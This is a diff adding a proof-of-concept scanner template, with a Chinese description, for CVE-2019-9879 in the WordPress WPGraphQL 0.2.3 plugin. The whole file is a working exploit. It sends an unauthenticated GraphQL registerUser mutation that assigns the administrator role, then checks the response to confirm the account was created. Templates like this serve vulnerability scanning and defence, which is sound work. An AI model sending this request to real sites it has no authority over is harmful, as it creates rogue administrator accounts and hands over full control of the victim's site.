@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "检测目标站点WPGraphQL插件是否存在未授权注册管理员用户漏洞，通过发送GraphQL mutation请求尝试创建管理员账户"
+id = "POC-AVE-2019-0220"
+name = "WordPress WPGraphQL 0.2.3 未授权管理员账户注册 PoC"
+severity = "critical"
+tags = ["ave-2019-0220"]
+vuln_id = [
+    "CVE-2019-9879",
+    "AVE-2019-0220",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/graphql"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"query": "mutation{registerUser(input:{clientMutationId:\"UWHATM8\",email:\"{{user_email}}\",password:\"{{password}}\",username:\"{{username}}\",roles:[\"administrator\"])}{clientMutationId}}"}'
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "UWHATM8",
+    '{"status":',
+]
